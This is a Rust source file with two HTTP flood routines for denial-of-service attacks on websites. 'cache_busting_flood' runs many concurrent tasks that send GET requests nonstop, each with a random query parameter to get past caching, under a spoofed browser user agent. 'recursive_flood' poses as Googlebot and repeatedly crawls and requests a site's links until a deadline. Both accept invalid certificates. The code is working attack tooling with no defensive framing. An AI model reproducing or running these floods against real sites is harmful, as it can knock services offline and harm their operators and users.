use reqwest::Client;
// use std::time::Duration;
use rand::{Rng, SeedableRng};
use rand::rngs::StdRng;
use std::sync::Arc;
use tokio::time::Instant;

// A. HTTP Cache Busting
pub async fn cache_busting_flood(url: &str, duration_secs: u64) {
    let client = Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap_or_default();
    
    let client = Arc::new(client);
    let start_time = Instant::now();
    let url = url.to_string();

    let mut handles = vec![];
    for _ in 0..num_cpus::get() * 2 {
        let c = client.clone();
        let u = url.clone();
        
        handles.push(tokio::spawn(async move {
            let mut rng = StdRng::from_entropy();
            while start_time.elapsed().as_secs() < duration_secs {
                // Add random query param
                let random_str: String = (0..10).map(|_| rng.sample(rand::distributions::Alphanumeric) as char).collect();
                let target = if u.contains('?') {
                     format!("{}&buster={}", u, random_str)
                } else {
                     format!("{}?buster={}", u, random_str)
                };
                
                let _ = c.get(&target).send().await;
            }
        }));
    }
    for h in handles { let _ = h.await; }
}

// B. Recursive GET (Crawler)
pub async fn recursive_flood(url: &str, duration_secs: u64) {
    let client = Client::builder()
        .user_agent("Googlebot/2.1 (+http://www.google.com/bot.html)")
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap_or_default();
    let client = Arc::new(client);
    let start_time = Instant::now();
    let root_url = url.to_string();

    // Simple BFS/Random Walk
    // Workers independently crawl
    let mut handles = vec![];
    for _ in 0..num_cpus::get() {
        let c = client.clone();
        let u = root_url.clone();
        handles.push(tokio::spawn(async move {
            while start_time.elapsed().as_secs() < duration_secs {
                // 1. Fetch Root
                if let Ok(resp) = c.get(&u).send().await {
                   if let Ok(text) = resp.text().await {
                       // 2. Parse Links (Simple)
                       let links = extract_links(&text, &u);
                       // 3. Visit Links
                       for link in links.iter().take(10) { // Visit first 10 found
                           let _ = c.get(link).send().await;
                       }
                   }
                }
            }
        }));
    }
    for h in handles { let _ = h.await; }
}

fn extract_links(html: &str, base_url: &str) -> Vec<String> {
    let mut links = Vec::new();
    // Naive parse: href="..."
    let mut search_idx = 0;
    while let Some(idx) = html[search_idx..].find("href=\"") {
        let start_quote = search_idx + idx + 6;
        if let Some(end_quote) = html[start_quote..].find('"') {
            let link = &html[start_quote..start_quote + end_quote];
            if link.starts_with("http") {
                links.push(link.to_string());
            } else if link.starts_with('/') {
                // Relative struct
                // Assume base_url is http://domain.com (no trailing slash handled perfectly here, simplified)
                // If base ends with /, remove it? Or just concat?
                let clean_base = base_url.trim_end_matches('/');
                links.push(format!("{}{}", clean_base, link));
            }
            search_idx = start_quote + end_quote;
        } else {
            break;
        }
    }
    links
}
